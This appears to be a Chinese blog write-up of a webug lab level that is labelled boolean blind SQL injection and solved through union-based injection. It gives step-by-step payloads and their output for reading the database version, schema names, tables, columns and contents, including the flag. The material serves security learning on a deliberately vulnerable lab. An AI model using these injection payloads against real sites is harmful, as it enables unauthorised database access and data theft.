---
title: webug之布尔注入
toc: true
description: >-
    本来想写关于 sqli-lib less 5 的笔记的，结果总感觉它不是那种很经典的布尔盲注的例子，还是 webug 这个比较恰当、正常。ps:然并软,
    webug 这个布尔注入, 也是虚晃一枪, 有显示位,故我采用的回显注入.
categories:
    - websec
    - sql injection
date: 2019-07-27 10:52:35
tags:
---

# **基于布尔的盲注简介**

**Web 的页面的仅仅会返回 True 和 False 两种状态**，对咱们来说，也就是正常和不正常。当然，这个不正常的是怎么不正常，样子就多了。比如：网页中的某处缺少一块元素，某些位置不能正常显示等。

那么布尔盲注就是进行 SQL 注入之后然后根据页面返回的 True 或者是 False （也是就是页面是否显示正常）来得到数据库中的相关信息。

就先介绍这些基础知识，便于我们注入的时候判断是不是布尔

## 检测注入点

### 单引号测试

测试后，我们发现

> 站长下载()是中国最大的站长类资源下载网站，提供最新最全的源码和站长类工具下载，专设源码报导栏目提供权威的源码评测和教程，推荐国内外优秀源码。

相较于 id = 1 正常显示页面，我们加单引号之后，这一段文字没有了，即：页面显示不正常了。

### 注释测试

?id=1' --+ 页面显示正常

由此，我们得出两点：

1. 没有报错提示，只有显示正常与不正常。基于我们对布尔盲注的认识，我们认为这可能是布尔盲注。
2. 这里我们猜测是字符型的 id = '1'

如果不确定的话，我们还可以进行一下测试

1. 用双引号测试，又发现正常显示。（我们也不必着急去猜测 sql 查询语句，因为没有报错，没办法猜。）
2. id = -1，显示不正常

在我们仍不确定是否是布尔盲注的时候，我们接着按照回显注入的流程进行

## order by 猜字段

首先在猜字段的过程中，页面没有任何报错，只有正常与正常显示。order by 2 时，显示正常，order by 3 时，显示不正常。故字段数为 2

## 确定显示位

?id=1' union select 1,2 --+

我们突然发现第二个字段是个显示位，就上面说的时不时消失的那段话的尾部。

嗯，本来想讲布尔盲注的，看来 webug 的这个题设置的也不好 emm。

其实前期，页面不报错，只有正常与不正常显示，是布尔盲注的一大特定。但这也不经意交给我们一个道理：不要完全相信经验（那些特征等），只有根据实际情况，才能做出最佳的判断，回显注入可比布尔盲注轻松多了。

## 爆版本等信息

```php
?id=1' union select 1,concat_ws(', ',version(),database(),user(),@@datadir,@@version_compile_os) --+
```

或

```php
?id=-1' union select 1,concat_ws(', ',version(),database(),user(),@@datadir,@@version_compile_os) --+
```

从这里我们知道 id = 1 查询的就是那段话。
回显：5.5.53, webug, root@localhost, C:\phpStudy\MySQL\data\, Win32

## 爆库名

```php
?id=-1' union select 1,group_concat(schema_name) from information_schema.schemata --+
```

回显：information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte

## 爆 webug 库中的表

```php
?id=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='webug' --+
```

回显：data_crud,env_list,env_path,flag,sqlinjection,user,user_test

## 爆 flag 表的字段名

```php
?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' --+
```

回显：id,flag

虽然之前回显注入那一关, 就是用的这个库里面的 flag, 我还是义无反顾地爆了这个表的内容 emm(不知道当时怎么想的...)

### 爆表中的数据

```php
?id=-1' union select 1,group_concat(concat_ws(', ',id,flag) SEPARATOR ';') from flag --+
```

回显：1, dfafdasfafdsadfa

提交 flag 果然不对.

## 爆 sqlinjection 表的字段名

```php
?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='sqlinjection' --+
```

回显：id,content,id,content
奇怪，列名还能重复？？？经过查证, webug 里面有两个 sqlinjection 表，另一个表在 webug_width_byte 库中，该表也有 id，content 两个字段，
**经验教训：爆字段名时，将库名和表名都要指定，避免出现不同库出现相同表的原因。**

```php
?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='webug' and table_name='sqlinjection' --+
```

### 爆表中的数据

```php
?id=-1' union select 1,group_concat(concat_ws(', ',id,content) separator '; ') from sqlinjection --+
```

内容:
1, 站长下载....优秀源码。;
2, hello

又没有 flag

## 爆 data_crud 表的字段名

```php
?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='data_crud' --+
```

回显:
id,name,age,email,gender

看着不像 flag

## 换表: env_list

```php
?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='env_list' --+
```

回显: id,envName,envDesc,envIntegration,delFlag,envFlag,level,type

### 爆 delFlag 和 envFlag 字段内容

```php
?id=-1' union select 1,group_concat(concat_ws(', ',delFlag,envFlag) separator '; ') from env_list --+
```

回显了一堆呀:
0, dfafdasfafdsadfa; 0, fdsafsdfa; 0, gfdgdfsdg; 0, dsfasdczxcg; 0, safsafasdfasdf; 0, dfsadfsadfas; 0, ddfasdfsafsadfsd; 0, ; 0, fsdafasdfas; 0, asdfsdfadfsdrew; 0, htryyujryfhyjtrjn; 0, uoijkhhnloh; 0, poipjklkjppoi; 0; 0, sadfvgsadfhe; 0, poiplmkounipoj; 0, sadfsadfsdadf; 0, sdfasdfgfddst; 0, vnghuytiuygui; 0, sadfhbvjyyiyukuyt; 0, vbchjgwestruyi; 0; 0; 0; 0; 0; 0; 0; 0; 0

看来 delFlag 好多是 0, 还是不看它了.

简化一下:

```php
?id=-1' union select 1,group_concat(envFlag separator '; ') from env_list group by delFlag --+
```

回显:

dfafdasfafdsadfa; sadfsadfsdadf; sdfasdfgfddst; vnghuytiuygui; sadfhbvjyyiyukuyt; vbchjgwestruyi; poiplmkounipoj; sadfvgsadfhe; fdsafsdfa; gfdgdfsdg; dsfasdczxcg; safsafasdfasdf; dfsadfsadfas; ddfasdfsafsadfsd; ; fsdafasdfas; asdfsdfadfsdrew; htryyujryfhyjtrjn; uoijkhhnloh; poipjklkjppoi

这么一堆 flag 难道是 webug 所有的 flag? 瞬间开心,一个个试,试出 fdsafsdfa 为布尔注入这一关的 flag.

至此, 不小心发现的使用回显注入的布尔注入题目完结.

布尔注入我还是再找一个别的注入点写吧.

# 总结回顾

1. 在进行注入点测试之前，先大致看一下页面，这样如果是布尔盲注，可以在测试时，快速发现,当然,如果前期有些特征,不要着急用布尔盲注,可以先试试回显注入。
2. **爆字段名时，将库名和表名都要指定，避免出现不同库出现相同表的原因。**
